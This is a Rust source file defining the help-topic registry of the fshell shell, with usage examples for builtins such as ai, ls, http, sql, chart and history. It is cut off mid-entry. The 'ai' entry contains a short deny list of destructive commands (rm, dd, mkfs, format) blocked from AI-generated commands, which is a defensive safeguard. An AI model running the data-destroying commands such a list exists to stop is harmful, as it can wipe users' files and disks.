// SPDX-License-Identifier: GPL-3.0-or-later
// Copyright (C) 2026 Francesco Duca <f.duca00@gmail.com>

use fshell_core::{FxIndexMap, Val};

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum HelpCategory {
    Builtin,
    Pipeline,
    Language,
    Security,
    Concepts,
}

impl HelpCategory {
    pub fn label(&self) -> &'static str {
        match self {
            HelpCategory::Builtin => "Built-in Command",
            HelpCategory::Pipeline => "Pipeline Operator",
            HelpCategory::Language => "Language Construct",
            HelpCategory::Security => "Security",
            HelpCategory::Concepts => "Shell Concept",
        }
    }

    pub fn header(&self) -> &'static str {
        match self {
            HelpCategory::Builtin => "BUILTINS",
            HelpCategory::Pipeline => "PIPELINE OPERATORS",
            HelpCategory::Language => "LANGUAGE CONSTRUCTS",
            HelpCategory::Security => "SECURITY",
            HelpCategory::Concepts => "SHELL CONCEPTS",
        }
    }

    pub fn description(&self) -> &'static str {
        match self {
            HelpCategory::Builtin => "File management, data utilities, shell commands",
            HelpCategory::Pipeline => "Data transformation, filtering, serialization",
            HelpCategory::Language => "Variables, types, control flow, reactive cells",
            HelpCategory::Security => "Capabilities, strict mode, permissions",
            HelpCategory::Concepts => "Jobs system, environment, startup",
        }
    }
}

pub struct HelpExample {
    pub input: &'static str,
    pub explanation: &'static str,
}

pub struct HelpFlag {
    pub flag: &'static str,
    pub desc: &'static str,
}

pub struct HelpTopic {
    pub name: &'static str,
    pub category: HelpCategory,
    pub summary: &'static str,
    pub description: &'static str,
    pub syntax: &'static str,
    pub examples: &'static [HelpExample],
    pub flags: &'static [HelpFlag],
    pub related: &'static [&'static str],
}

impl HelpTopic {
    pub fn to_val(&self) -> Val {
        let mut m = FxIndexMap::with_hasher(fshell_hash::FxBuildHasher::default());
        m.insert(ustr::ustr("name"), Val::String(self.name.to_string()));
        let cat_str = match self.category {
            HelpCategory::Builtin => "builtin",
            HelpCategory::Pipeline => "pipeline",
            HelpCategory::Language => "language",
            HelpCategory::Security => "security",
            HelpCategory::Concepts => "concepts",
        };
        m.insert(ustr::ustr("category"), Val::String(cat_str.to_string()));
        m.insert(
            ustr::ustr("category_label"),
            Val::String(self.category.label().to_string()),
        );
        m.insert(ustr::ustr("summary"), Val::String(self.summary.to_string()));
        m.insert(
            ustr::ustr("description"),
            Val::String(self.description.to_string()),
        );
        m.insert(ustr::ustr("syntax"), Val::String(self.syntax.to_string()));

        let examples_list: Vec<Val> = self
            .examples
            .iter()
            .map(|ex| {
                let mut ex_map = FxIndexMap::with_hasher(fshell_hash::FxBuildHasher::default());
                ex_map.insert(ustr::ustr("input"), Val::String(ex.input.to_string()));
                ex_map.insert(
                    ustr::ustr("explanation"),
                    Val::String(ex.explanation.to_string()),
                );
                Val::Map(ex_map)
            })
            .collect();
        m.insert(ustr::ustr("examples"), Val::List(examples_list));

        let flags_list: Vec<Val> = self
            .flags
            .iter()
            .map(|f| {
                let mut f_map = FxIndexMap::with_hasher(fshell_hash::FxBuildHasher::default());
                f_map.insert(ustr::ustr("flag"), Val::String(f.flag.to_string()));
                f_map.insert(ustr::ustr("desc"), Val::String(f.desc.to_string()));
                Val::Map(f_map)
            })
            .collect();
        m.insert(ustr::ustr("flags"), Val::List(flags_list));

        let related_list: Vec<Val> = self
            .related
            .iter()
            .map(|r| Val::String(r.to_string()))
            .collect();
        m.insert(ustr::ustr("related"), Val::List(related_list));

        Val::Map(m)
    }
}

// Registry

pub static TOPICS: &[HelpTopic] = &[
    // Builtins
    HelpTopic {
        name: "ai",
        category: HelpCategory::Builtin,
        summary: "Natural language to fsh command generation",
        description: "Convert natural language descriptions into valid fsh commands using an AI provider (default: NVIDIA NIM). Supports run mode (auto-execute), explain mode (describe a command), and interactive chat mode. When a request is impossible as an fsh builtin, the AI can use external commands via the bridge. Destructive commands (rm, mv, cp, dd, mkfs, format) are blocked at the AST level for safety.\n\nProviders: nvidia-nim (NVIDIA NIM via build.nvidia.com), anthropic (Anthropic Claude), ollama (local Ollama instance). Set the API key via NVIDIA_API_KEY, ANTHROPIC_API_KEY, or FSH_AI_API_KEY environment variables. Select provider via the FSH_AI_PROVIDER env var or the --provider flag.",
        syntax: "ai [FLAGS] [PROMPT...]",
        examples: &[
            HelpExample {
                input: "ai \"find all rust files\"",
                explanation: "Generate an fsh command to find Rust files.",
            },
            HelpExample {
                input: "ai --run \"show disk usage by directory\"",
                explanation: "Generate and execute a command without confirmation prompt.",
            },
            HelpExample {
                input: "ai --explain \"ls | filter size > 1000 | sort size desc\"",
                explanation: "Explain what an fsh pipeline does in natural language.",
            },
            HelpExample {
                input: "ai --chat",
                explanation: "Enter interactive conversational chat mode with the AI.",
            },
            HelpExample {
                input: "ai --provider ollama --model llama3 \"list files\"",
                explanation: "Use a specific provider and model override.",
            },
        ],
        flags: &[
            HelpFlag { flag: "--run, -r", desc: "Skip the confirmation prompt and execute immediately" },
            HelpFlag { flag: "--explain, -e", desc: "Explain an fsh command in natural language" },
            HelpFlag { flag: "--chat, -c", desc: "Enter interactive chat mode" },
            HelpFlag { flag: "--provider, -p <NAME>", desc: "Override AI provider (nvidia-nim, anthropic, ollama)" },
            HelpFlag { flag: "--model, -m <NAME>", desc: "Override model name for the current provider" },
            HelpFlag { flag: "--list-providers", desc: "List available AI providers" },
        ],
        related: &["help"],
    },
    HelpTopic {
        name: "ls",
        category: HelpCategory::Builtin,
        summary: "List directory contents",
        description: "List directory entries under capability checks. Each entry is emitted as a record with fields for name, size, type, and metadata. Requires read capability on the target path.",
        syntax: "ls [path] [-a] [-v]",
        examples: &[
            HelpExample {
                input: "ls",
                explanation: "List current directory contents.",
            },
            HelpExample {
                input: "ls /etc",
                explanation: "List /etc directory (requires read permission).",
            },
            HelpExample {
                input: "ls -a",
                explanation: "List all entries including hidden files.",
            },
            HelpExample {
                input: "ls -v",
                explanation: "Verbose output including permissions field.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "-a",
                desc: "Include hidden entries (files starting with '.')",
            },
            HelpFlag {
                flag: "-v",
                desc: "Verbose: include permissions field in output",
            },
        ],
        related: &["cd", "capabilities"],
    },
    HelpTopic {
        name: "ff",
        category: HelpCategory::Builtin,
        summary: "Find files by name, size, type, and modified time",
        description: "Recursively search the filesystem for files and directories matching filter criteria. Each match is emitted as a structured record with fields for path, name, size, type, and last modified time.\n\nFilters can be chained with 'and' for readability. The search path is the first positional argument (defaults to current directory).",
        syntax: "ff [path] [filters...]",
        examples: &[
            HelpExample {
                input: "ff",
                explanation: "List all files and directories recursively from the current directory.",
            },
            HelpExample {
                input: "ff src",
                explanation: "Search recursively from the src directory.",
            },
            HelpExample {
                input: "ff name = \"*.rs\"",
                explanation: "Find all Rust source files.",
            },
            HelpExample {
                input: "ff name = \"*.rs\" and size > 1mb",
                explanation: "Find Rust files larger than 1 megabyte.",
            },
            HelpExample {
                input: "ff name = \"test*\" and modified < 7d",
                explanation: "Find test files modified in the last 7 days.",
            },
            HelpExample {
                input: "ff type = \"dir\"",
                explanation: "Find only directories.",
            },
            HelpExample {
                input: "ff -n 10",
                explanation: "Limit to the first 10 matches.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "-n <N>",
                desc: "Stop after N matches",
            },
            HelpFlag {
                flag: "--depth <N>",
                desc: "Maximum recursion depth",
            },
            HelpFlag {
                flag: "hidden",
                desc: "Include hidden files and directories (those starting with '.')",
            },
        ],
        related: &["ls", "cd", "z", "filter", "map"],
    },
    HelpTopic {
        name: "http",
        category: HelpCategory::Builtin,
        summary: "Make HTTP requests with structured JSON output",
        description: "Make HTTP requests to remote APIs and get responses back as structured data. JSON responses are automatically parsed into pipeline records — arrays become multiple records, objects become maps. Use --text to get the raw response body as a string.\n\nBy default the method is GET if the URL is provided first. Or specify the method explicitly: http get|post|put|patch|delete|head <url>.",
        syntax: "http [method] <url> [-H header...] [-b body] [-t timeout_ms] [--text]",
        examples: &[
            HelpExample {
                input: "http https://api.github.com/repos/FraSharp/fshell",
                explanation: "Simple GET request. Response JSON is auto-parsed into pipeline records.",
            },
            HelpExample {
                input: "http get https://api.github.com/repos/FraSharp/fshell/issues | filter state == \"open\"",
                explanation: "Get open issues using pipeline filter on the parsed JSON.",
            },
            HelpExample {
                input: "http https://api.github.com/repos/FraSharp/fshell/issues | count",
                explanation: "Count total issues from a JSON array response.",
            },
            HelpExample {
                input: "http post https://api.example.com/data -H \"Authorization: Bearer token123\" -b '{\"key\":\"value\"}'",
                explanation: "POST JSON data with a custom header.",
            },
            HelpExample {
                input: "http get https://example.com --text | grep \"<title>\"",
                explanation: "Get raw text response and pipe to grep.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "-H <header>",
                desc: "Add a request header (can be repeated)",
            },
            HelpFlag {
                flag: "-b <body>",
                desc: "Request body string",
            },
            HelpFlag {
                flag: "-t <ms>",
                desc: "Request timeout in milliseconds (default: 10000)",
            },
            HelpFlag {
                flag: "--text",
                desc: "Return response as raw text instead of parsing JSON",
            },
        ],
        related: &["filter", "map", "count", "capabilities"],
    },
    HelpTopic {
        name: "chart",
        category: HelpCategory::Builtin,
        summary: "Draw inline ASCII bar charts, tables, and histograms from pipeline data",
        description: "Takes structured pipeline input and renders terminal-friendly charts. Group records by a field (--by), then count occurrences (--count) or aggregate a numeric field (--val). Supports bar charts, tables, and histograms.\n\nBar charts render as labeled ASCII bars with values. Tables show column-aligned field/value pairs. Histograms automatically bucket numeric values and show distribution.",
        syntax: "chart --by <field> [--val <field>] [--count] [--type bar|table|histogram] [--sort asc|desc] [-n N]",
        examples: &[
            HelpExample {
                input: "ps | chart --by user --count --type bar",
                explanation: "Show process count by user as a bar chart.",
            },
            HelpExample {
                input: "http https://api.github.com/repos/FraSharp/fshell/issues | chart --by state --count",
                explanation: "Group GitHub issues by state and show counts.",
            },
            HelpExample {
                input: "ps | chart --by user --val rss --sort desc -n 5",
                explanation: "Top 5 users by RSS memory usage.",
            },
            HelpExample {
                input: "ff size > 1mb | chart --by type --val size --type table",
                explanation: "Show total size by file type in a table.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "--by <field>",
                desc: "Field to group by (x-axis / rows)",
            },
            HelpFlag {
                flag: "--val <field>",
                desc: "Numeric field to aggregate (default: auto-count with --count)",
            },
            HelpFlag {
                flag: "--count",
                desc: "Use occurrence count instead of a value field",
            },
            HelpFlag {
                flag: "--type <type>",
                desc: "Chart type: bar (default), table, or histogram",
            },
            HelpFlag {
                flag: "--sort <order>",
                desc: "Sort by value: desc (default) or asc",
            },
            HelpFlag {
                flag: "-n <N>",
                desc: "Show only top N rows",
            },
        ],
        related: &["ps", "ff", "http", "filter", "count", "group-by"],
    },
    HelpTopic {
        name: "sql",
        category: HelpCategory::Builtin,
        summary: "Query SQLite databases directly into structured pipeline data",
        description: "Opens a local SQLite database file, executes an SQL query, and emits each result row as a structured Val::Map with column names as keys. Column types are preserved: TEXT→String, INTEGER→Int, REAL→Float, NULL→Null, BLOB→hex-encoded String.\n\nRequires read capability on the database file. Large result sets yield periodically to avoid blocking the shell.",
        syntax: "sql <path> <query>",
        examples: &[
            HelpExample {
                input: "sql ./chinook.db \"SELECT * FROM customers LIMIT 5\"",
                explanation: "Query a SQLite database and get structured records.",
            },
            HelpExample {
                input: "sql ./chinook.db \"SELECT Name, Milliseconds FROM tracks WHERE AlbumId = 1\" | filter Milliseconds > 200000",
                explanation: "Filter query results through the pipeline.",
            },
            HelpExample {
                input: "sql ./data.db \"SELECT status, COUNT(*) as cnt FROM orders GROUP BY status\" | chart --by status --val cnt --type bar",
                explanation: "Pipe SQL results into chart for visualization.",
            },
        ],
        flags: &[],
        related: &["chart", "filter", "map", "count", "group-by"],
    },
    HelpTopic {
        name: "copy",
        category: HelpCategory::Builtin,
        summary: "Copy pipeline data to an in-memory clipboard",
        description: "Reads pipeline input and stores it in a global structured clipboard buffer. Records are preserved with full type fidelity — Ints stay Ints, Maps stay Maps. Later, paste retrieves them as structured data.",
        syntax: "copy",
        examples: &[
            HelpExample {
                input: "ps | filter cpu > 20 | copy",
                explanation: "Copy high-CPU processes to the structured clipboard.",
            },
            HelpExample {
                input: "paste | kill",
                explanation: "Paste PIDs from clipboard into kill (if paste emits numeric PIDs).",
            },
        ],
        flags: &[],
        related: &["paste"],
    },
    HelpTopic {
        name: "paste",
        category: HelpCategory::Builtin,
        summary: "Emit the contents of the structured clipboard into the pipeline",
        description: "Emits each record from the global clipboard buffer as a separate pipeline item. Use after copy to retrieve structured data in a different pipeline context.",
        syntax: "paste",
        examples: &[HelpExample {
            input: "paste | filter size > 1000",
            explanation: "Filter clipboard records with pipeline operators.",
        }],
        flags: &[],
        related: &["copy"],
    },
    HelpTopic {
        name: "replace",
        category: HelpCategory::Builtin,
        summary: "Replace text in files with a simple cross-platform command",
        description: "Replace all occurrences of a literal string with another string in matching files. No regex, no platform-dependent sed flags. Works standalone with glob patterns or piped from ff and other commands that emit file paths.\n\nWhen read from a pipeline, each incoming record is treated as a file path (its text representation) and processed in order.",
        syntax: "replace <old> <new> [in <glob>...] [--dry-run]",
        examples: &[
            HelpExample {
                input: "replace \"old_thing\" \"new_thing\" in *.rs",
                explanation: "Replace all occurrences of old_thing with new_thing in all Rust files.",
            },
            HelpExample {
                input: "replace \"foo\" \"bar\" in src/*.rs tests/*.rs",
                explanation: "Replace in multiple glob patterns.",
            },
            HelpExample {
                input: "ff name = \"*.toml\" | replace \"localhost\" \"127.0.0.1\"",
                explanation: "Pipe ff results into replace to process discovered files.",
            },
            HelpExample {
                input: "replace \"debug\" \"info\" in *.rs --dry-run",
                explanation: "Show what would change without modifying files.",
            },
        ],
        flags: &[HelpFlag {
            flag: "--dry-run",
            desc: "Show what would be changed without modifying any files",
        }],
        related: &["ff", "ls", "filter", "map"],
    },
    HelpTopic {
        name: "cd",
        category: HelpCategory::Builtin,
        summary: "Change working directory",
        description: "Change the current working directory. Supports '-' for the previous directory ($OLDPWD). Automatically falls back to smart frecency-based matching if the target directory path does not exist on disk.",
        syntax: "cd [path]",
        examples: &[
            HelpExample {
                input: "cd /etc",
                explanation: "Change to /etc directory.",
            },
            HelpExample {
                input: "cd ..",
                explanation: "Move to parent directory.",
            },
            HelpExample {
                input: "cd -",
                explanation: "Change to the previous directory ($OLDPWD).",
            },
            HelpExample {
                input: "cd doc",
                explanation: "Jump to highest ranked frecent match if 'doc' directory is not in current folder.",
            },
            HelpExample {
                input: "cd ~/Documents",
                explanation: "Change to Documents folder in home.",
            },
        ],
        flags: &[],
        related: &["ls", "z", "zi", "capabilities"],
    },
    HelpTopic {
        name: "clear",
        category: HelpCategory::Builtin,
        summary: "Clear the terminal screen and scrollback buffer",
        description: "Clears the entire terminal display and wipes the scrollback buffer, placing the prompt at the top of a clean terminal. Equivalent to bash/zsh 'reset' in its effect on the display — no previous output remains visible when scrolling up.",
        syntax: "clear",
        examples: &[
            HelpExample {
                input: "clear",
                explanation: "Clear the terminal completely, including scrollback history.",
            },
            HelpExample {
                input: "clear && ls",
                explanation: "Clear then list the directory.",
            },
        ],
        flags: &[],
        related: &["wrap"],
    },
    HelpTopic {
        name: "history",
        category: HelpCategory::Builtin,
        summary: "Search, filter, and view shell history backed by SQLite",
        description: "Manages command history stored in a SQLite database. In interactive mode, it opens a full-screen Ratatui search TUI. In pipeline mode, it returns a list of history records with command, cwd, timestamp, duration_ms, exit_code, hostname, username, and session_id.",
        syntax: "history [search_query] [-i] [--stats] [--cwd] [--session] [--global] [--host] [--exit <code>] [--limit <n>]",
        examples: &[
            HelpExample {
                input: "history",
                explanation: "Open the interactive full-screen TUI history search.",
            },
            HelpExample {
                input: "history --stats",
                explanation: "Display detailed history and command execution statistics.",
            },
            HelpExample {
                input: "history --exit 0",
                explanation: "Retrieve list of successful command entries.",
            },
            HelpExample {
                input: "history --cwd --limit 5",
                explanation: "Retrieve last 5 commands executed in the current directory.",
            },
            HelpExample {
                input: "history make | filter exit_code != 0",
                explanation: "Search for failed 'make' commands in structured pipeline.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "-i, --interactive",
                desc: "Explicitly open the interactive search TUI",
            },
            HelpFlag {
                flag: "--stats",
                desc: "Display database command statistics instead of entry logs",
            },
            HelpFlag {
                flag: "--cwd",
                desc: "Filter by the current directory",
            },
            HelpFlag {
                flag: "--session",
                desc: "Filter by the current terminal session ID",
            },
            HelpFlag {
                flag: "--global",
                desc: "Clear cwd/session filters to query global history",
            },
            HelpFlag {
                flag: "--host",
                desc: "Filter by the current machine hostname",
            },
            HelpFlag {
                flag: "--exit <code>",
                desc: "Filter by execution exit code (0 for success, non-zero for error)",
            },
            HelpFlag {
                flag: "--limit <n>",
                desc: "Limit the number of returned pipeline entries",
            },
        ],
        related: &["ls", "cd", "pipeline"],
    },
    HelpTopic {
        name: "jobs",
        category: HelpCategory::Builtin,
        summary: "List background and suspended jobs",
        description: "Display all active background tasks and suspended job groups with their IDs and states (Running, Suspended).",
        syntax: "jobs",
        examples: &[
            HelpExample {
                input: "jobs",
                explanation: "List all active jobs with their status.",
            },
            HelpExample {
                input: "jobs | count",
                explanation: "Count the number of active jobs.",
            },
        ],
        flags: &[],
        related: &["fg", "bg", "jobs-system"],
    },
    HelpTopic {
        name: "ps",
        category: HelpCategory::Builtin,
        summary: "List running processes with structured output",
        description: "Enumerate OS processes and emit each as a structured record with pid, ppid, user, cpu, memory, state, and command fields. By default shows only the current user's processes. Pipe into filter, map, count, and chart for analysis.\n\nInternally delegates to the system ps command with structured format flags. The output width is parsed into typed fields for pipeline use.",
        syntax: "ps [-a] [-p <pid>...]",
        examples: &[
            HelpExample {
                input: "ps",
                explanation: "List all processes owned by the current user.",
            },
            HelpExample {
                input: "ps | filter cpu > 50",
                explanation: "Show processes using more than 50% CPU.",
            },
            HelpExample {
                input: "ps | filter rss > 500000 | map pid,command",
                explanation: "Show PIDs and commands of processes using over 500MB RSS.",
            },
            HelpExample {
                input: "ps -a | count",
                explanation: "Count all running processes on the system.",
            },
            HelpExample {
                input: "ps | chart --by user --val rss --sort desc -n 5",
                explanation: "Show top 5 memory consumers grouped by user.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "-a",
                desc: "Show processes for all users (system-wide)",
            },
            HelpFlag {
                flag: "-p<pid>",
                desc: "Show only the process with the given PID (attached form, e.g. -p1234)",
            },
        ],
        related: &["jobs", "fg", "bg", "chart", "filter"],
    },
    HelpTopic {
        name: "fg",
        category: HelpCategory::Builtin,
        summary: "Resume job in foreground",
        description: "Bring a background or suspended job to the foreground, making it the active process and capturing terminal input.",
        syntax: "fg [job_id]",
        examples: &[
            HelpExample {
                input: "fg",
                explanation: "Bring the most recent background job to foreground.",
            },
            HelpExample {
                input: "fg 2",
                explanation: "Bring job #2 to foreground.",
            },
            HelpExample {
                input: "fg %1",
                explanation: "Bring job #1 to foreground (% syntax).",
            },
        ],
        flags: &[],
        related: &["bg", "jobs", "jobs-system"],
    },
    HelpTopic {
        name: "bg",
        category: HelpCategory::Builtin,
        summary: "Resume job in background",
        description: "Resume a suspended job in the background, allowing it to continue running without terminal input.",
        syntax: "bg [job_id]",
        examples: &[
            HelpExample {
                input: "bg",
                explanation: "Resume the most recent suspended job in background.",
            },
            HelpExample {
                input: "bg 1",
                explanation: "Resume job #1 in background.",
            },
        ],
        flags: &[],
        related: &["fg", "jobs", "jobs-system"],
    },
    HelpTopic {
        name: "export",
        category: HelpCategory::Builtin,
        summary: "Set environment variables",
        description: "Set an environment variable in both the shell's internal context and the host OS environment. Exported variables are inherited by spawned subprocesses. With no arguments, list all exported variables.",
        syntax: "export [KEY VALUE]",
        examples: &[
            HelpExample {
                input: "export",
                explanation: "List all exported environment variables.",
            },
            HelpExample {
                input: "export RUST_BACKTRACE 1",
                explanation: "Set RUST_BACKTRACE to enable debug traces.",
            },
            HelpExample {
                input: "export EDITOR vim",
                explanation: "Set the default editor to vim.",
            },
        ],
        flags: &[],
        related: &["env", "environment"],
    },
    HelpTopic {
        name: "env",
        category: HelpCategory::Builtin,
        summary: "Print environment variables",
        description: "Print all environment variables currently in scope, including those inherited from the host process and those set with export.",
        syntax: "env",
        examples: &[
            HelpExample {
                input: "env",
                explanation: "Display all environment variables.",
            },
            HelpExample {
                input: "env | grep PATH",
                explanation: "Filter environment variables by name.",
            },
        ],
        flags: &[],
        related: &["export", "environment"],
    },
    HelpTopic {
        name: "help",
        category: HelpCategory::Builtin,
        summary: "Display shell reference",
        description: "The primary entry point for all shell documentation. Run without arguments for an interactive TUI browser, or specify flags and topic names for text output. Specify a topic name for detailed (compact) information. Use --verbose/-v for the full reference.

When output is piped, structured data (lists of topic records or a single topic map) is automatically emitted instead of formatted text. Use --structured to force structured output.

Fuzzy search (--search/-s) matches against topic name, summary, and description. Category filtering (--category/-c) narrows to builtins, pipeline operators, language constructs, security, or concepts.",
        syntax: "help [topic] [--all | --quick | --topics | --verbose | --examples]\n      [--search <text>] [--category <cat>] [--tui | --structured]",
        examples: &[
            HelpExample {
                input: "help",
                explanation: "Open interactive TUI browser (fallback: category index).",
            },
            HelpExample {
                input: "help ls",
                explanation: "Show compact help for the ls command.",
            },
            HelpExample {
                input: "help ls -v",
                explanation: "Show full detailed help for ls.",
            },
            HelpExample {
                input: "help -q",
                explanation: "Compact listing of all topics (name + summary).",
            },
            HelpExample {
                input: "help -t",
                explanation: "List all topic names only.",
            },
            HelpExample {
                input: "help --all",
                explanation: "Display full documentation for every topic.",
            },
            HelpExample {
                input: "help filter --examples",
                explanation: "Show just the examples for the filter operator.",
            },
            HelpExample {
                input: "help -s chart",
                explanation: "Search for topics matching 'chart'.",
            },
            HelpExample {
                input: "help -c pipeline",
                explanation: "List all pipeline operator topics.",
            },
            HelpExample {
                input: "help -c pipeline -q",
                explanation: "Quick listing of pipeline operators (name + summary).",
            },
            HelpExample {
                input: "help -i",
                explanation: "Force open the interactive TUI browser.",
            },
            HelpExample {
                input: "help ls | filter …",
                explanation: "Pipe structured topic data through pipeline operators.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "--all, -a",
                desc: "Display all help topics in full detail",
            },
            HelpFlag {
                flag: "--quick, -q",
                desc: "Compact listing (name + summary per topic)",
            },
            HelpFlag {
                flag: "--topics, -t",
                desc: "Names-only listing (one per line)",
            },
            HelpFlag {
                flag: "--verbose, -v",
                desc: "Full detail view for a single topic",
            },
            HelpFlag {
                flag: "--examples, -e",
                desc: "Show examples only for a topic",
            },
            HelpFlag {
                flag: "--search, -s <text>",
                desc: "Fuzzy search topics by name, summary, description",
            },
            HelpFlag {
                flag: "--category, -c <cat>",
                desc: "Filter by category: builtin, pipeline, language, security, concepts",
            },
            HelpFlag {
                flag: "--tui, -i",
                desc: "Force interactive TUI browser",
            },
            HelpFlag {
                flag: "--structured, --json",
                desc: "Force structured (Val) output instead of formatted text",
            },
        ],
        related: &["ls", "filter", "capabilities", "type", "which"],
    },
    HelpTopic {
        name: "reload",
        category: HelpCategory::Builtin,
        summary: "Reload configuration or perform full state-preserving restart / rebuild",
        description: "Reloads the user init.fsh configuration file without restarting the shell. All current variables, functions, and capabilities are preserved and the init file is re-sourced on top of the existing state.\n\nWith --full, performs a full process handoff: serializes the entire shell state (variables, functions, capabilities, reactive pipelines) to a handoff file, then execvp's a fresh fshell process that restores the state. This allows upgrades to new binaries without losing the session.\n\nWith --build (or -b), rebuilds the fshell binary from source using cargo build (automatically detecting if release or debug profile should be used based on the running binary) before performing a full process handoff. Use --build-debug (-bd) to force a debug build, or --build-release (-br) to force a release build. If compilation fails, the reload is cancelled, preserving the current session.",
        syntax: "reload\nreload --full\nreload --build\nreload -b\nreload -bd\nreload -br",
        examples: &[
            HelpExample {
                input: "reload",
                explanation: "Re-source init.fsh configuration in the current session.",
            },
            HelpExample {
                input: "reload --full",
                explanation: "Full process handoff — serializes state and execvp's a new fshell process.",
            },
            HelpExample {
                input: "reload --build",
                explanation: "Rebuild the shell from source and perform full process handoff to the new binary.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "--full",
                desc: "Perform full process handoff with state preservation",
            },
            HelpFlag {
                flag: "--build, -b",
                desc: "Rebuild the shell from source before reloading (auto-detects profile)",
            },
            HelpFlag {
                flag: "--build-debug, -bd",
                desc: "Force a debug build before reloading",
            },
            HelpFlag {
                flag: "--build-release, -br",
                desc: "Force a release build before reloading",
            },
        ],
        related: &["startup"],
    },
    HelpTopic {
        name: "alias",
        category: HelpCategory::Builtin,
        summary: "Define, list, or delete shell aliases",
        description: "Define short command aliases that expand to longer fshell commands. Aliases are registered for the current session and automatically persisted to ~/.config/fsh/init.fsh so they are available in every future session.\n\nIf you define an alias that already exists, a notice is printed before overriding it. The old entry is removed from init.fsh and replaced with the new one.\n\nAliases are resolved before builtins, user-defined functions, and external commands, so they take highest priority at the command dispatch level. Extra arguments passed after the alias name are appended to the expansion.",
        syntax: "alias\nalias NAME EXPANSION\nalias --delete NAME\nalias -d NAME",
        examples: &[
            HelpExample {
                input: "alias ll \"ls -la\"",
                explanation: "Define 'll' as a shorthand for 'ls -la'. Saved to init.fsh.",
            },
            HelpExample {
                input: "alias gst \"git status\"",
                explanation: "Alias 'gst' to the external 'git status' command.",
            },
            HelpExample {
                input: "alias",
                explanation: "List all currently defined aliases.",
            },
            HelpExample {
                input: "alias --delete ll",
                explanation: "Remove the 'll' alias from the session and from init.fsh.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "--delete / -d",
                desc: "Remove an alias from the session and from init.fsh",
            },
            HelpFlag {
                flag: "--force",
                desc: "Override an existing alias (still prints an override notice)",
            },
        ],
        related: &["reload", "startup", "export"],
    },
    HelpTopic {
        name: "self",
        category: HelpCategory::Builtin,
        summary: "Reference the current running fsh binary",
        description: "Resolve the path to the currently running fsh binary, independent of $PATH, argv[0], or multicall symlinks (e.g. `ls`). Useful for re-invoking the same binary in scripts, wrappers, and handoff restarts.\n\nThe binary path is resolved once at shell startup via `std::env::current_exe()` with argv[0] fallback and cached for the process lifetime; `Env::exe_path` stores the canonical result and `$FSH_EXE` / `$FSH_VERSION` mirror it as shell variables. Unlike `which fsh` or `$SHELL`, `self` always points at the exact image that is executing, even when invoked as `ls` via multicall or after a `cargo run` with a temporary target path.",
        syntax: "self [--exe] [--pid] [--version] [--info] [--structured|--json] [--help]\nself exec [args...]\nself --exec [args...]",
        examples: &[
            HelpExample {
                input: "self",
                explanation: "Print the current fsh binary path (same as $FSH_EXE).",
            },
            HelpExample {
                input: "self --version",
                explanation: "Print the fsh version (same as $FSH_VERSION).",
            },
            HelpExample {
                input: "self --pid",
                explanation: "Print the shell's PID.",
            },
            HelpExample {
                input: "self --info | map exe,version",
                explanation: "Emit structured info map and project fields.",
            },
            HelpExample {
                input: "self exec -c 'ls | count'",
                explanation: "Re-exec the same binary with a one-shot command (execvp, replaces process).",
            },
            HelpExample {
                input: "exec (self) --handoff /tmp/h.json",
                explanation: "Command substitution form for handoff restarts.",
            },
        ],
        flags: &[
            HelpFlag {
                flag: "--exe",
                desc: "Print exe path (default)",
            },
            HelpFlag {
                flag: "--pid",
                desc: "Print current process id",
            },
            HelpFlag {
                flag: "--version",
                desc: "Print fsh version",
            },
            HelpFlag {
                flag: "--info",
                desc: "Emit structured map {exe, pid, version, profile, argv0}",
            },
            HelpFlag {
                flag: "--structured, --json",
                desc: "Force structured output (full info map)",
            },
            HelpFlag {
                flag: "exec",
                desc: "Replace process with current exe + args (execvp)",
            },
        ],
        related: &["exec", "reload", "which", "type"],
    },
    HelpTopic {
        name: "read",
        category: HelpCategory::Builtin,
        summary: "Read a line from stdin into a variable",
        description: "Reads a line from standard input and stores it in a variable. Useful for interactive prompts and script input handling. Trims trailing newline.\n\nWhen called without a variable name, stores the result in $REPLY by default.",
        syntax: "read [<variable>]",
        examples: &[
            HelpExample {
                input: "read name",
                explanation: "Read user input into $name.",
            },
            HelpExample {
                input: "echo 'Enter value:' | read val",
                explanation: "Read piped input into $val.",
            },
        ],
        flags: &[],
        related: &["echo", "variables"],
    },
    HelpTopic {
        name: "unsetopt",
        category: HelpCategory::Builtin,
        summary: "Disable a shell option",
        description: "Disables a shell option that was previously enabled with setopt. Run without arguments to list all options and their current state.\n\nOptions control shell behavior such as glob expansion, history deduplication, and prompt display.",
        syntax: "unsetopt [<option>]",
        examples: &[
            HelpExample {
                input: "unsetopt nullglob",
                explanation: "Re-enable the default behavior: unmatched glob patterns stay literal instead of expanding to nothing.",
            },
            HelpExample {
                input: "unsetopt",
                explanation: "List all options and their enabled/disabled state.",
            },
        ],
        flags: &[],
        related: &["setopt", "config"],
    },
    HelpTopic {
        name: "hook",
        category: HelpCategory::Builtin,
        summary: "Register or list shell event hooks",
        description: "Register callback commands that run when shell events fire. Hooks let you automate behavior on events like directory changes, command execution, or shell startup.\n\nAvailable hook events include chpwd (directory change), precmd (before each prompt), and preexec (before each command).",
        syntax: "hook [<event> <command>]",
        examples: &[
            HelpExample {
                input: "hook chpwd ls",
                explanation: "List directory contents automatically after every cd.",
            },
            HelpExample {
                input: "hook",
                explanation: "List all registered hooks and their commands.",
            },
        ],
        flags: &[],
        related: &["reload", "startup", "alias"],
    },
    HelpTopic {
        name: "git",
        category: HelpCategory::Builtin,
        summary: "Run git commands with structured output",
        description: "Execute git commands and get structured output (branches, commits, status) as pipeline records. Parses common git output formats into structured data for further pipeline processing.",
        syntax: "git <subcommand> [args...]",
        examples: &[
            HelpExample {
                input: "git branch",
                explanation: "List branches as structured records.",
            },
            HelpExample {
                input: "git status",
                explanation: "Show working tree status.",
            },
        ],
        flags: &[],
        related: &[],
    },
    HelpTopic {
        name: "directory-stack",
        category: HelpCategory::Builtin,
        summary: "Manage directory stack with pushd, popd, dirs",
